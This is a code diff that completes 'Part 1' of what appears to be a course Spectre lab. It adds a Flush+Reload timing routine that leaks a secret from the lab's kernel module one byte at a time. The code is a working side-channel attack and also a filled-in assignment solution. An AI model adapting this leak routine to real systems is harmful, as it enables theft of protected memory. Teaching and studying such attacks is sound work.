@@ -11,6 +11,8 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define NUM_ATTEMPTS 100
+
 /*
  * call_kernel_part1
  * Performs the COMMAND_PART1 call in the kernel
@@ -29,6 +31,45 @@ static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
 
+static void flush_shared_memory(char *shared_memory) {
+    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
+        clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
+    }
+}
+
+static char leak_byte_at_offset(int kernel_fd, char *shared_memory, size_t offset) {
+    int scores[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};
+
+    for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
+        uint64_t best_latency = UINT64_MAX;
+        size_t best_candidate = 0;
+
+        flush_shared_memory(shared_memory);
+        call_kernel_part1(kernel_fd, shared_memory, offset);
+
+        for (size_t candidate = 0; candidate < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; candidate++) {
+            uint64_t latency = time_access(&shared_memory[candidate * SHD_SPECTRE_LAB_PAGE_SIZE]);
+            if (latency < best_latency) {
+                best_latency = latency;
+                best_candidate = candidate;
+            }
+        }
+
+        scores[best_candidate]++;
+    }
+
+    int best_score = -1;
+    size_t best_candidate = 0;
+    for (size_t candidate = 0; candidate < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; candidate++) {
+        if (scores[candidate] > best_score) {
+            best_score = scores[candidate];
+            best_candidate = candidate;
+        }
+    }
+
+    return (char)best_candidate;
+}
+
 /*
  * run_attacker
  *
@@ -43,13 +84,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
-        char leaked_byte;
-
-        // [Part 1]- Fill this in!
-        // Feel free to create helper methods as necessary.
-        // Use "call_kernel_part1" to interact with the kernel module
-        // Find the value of leaked_byte for offset "current_offset"
-        // leaked_byte = ??
+        char leaked_byte = leak_byte_at_offset(kernel_fd, shared_memory, current_offset);
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
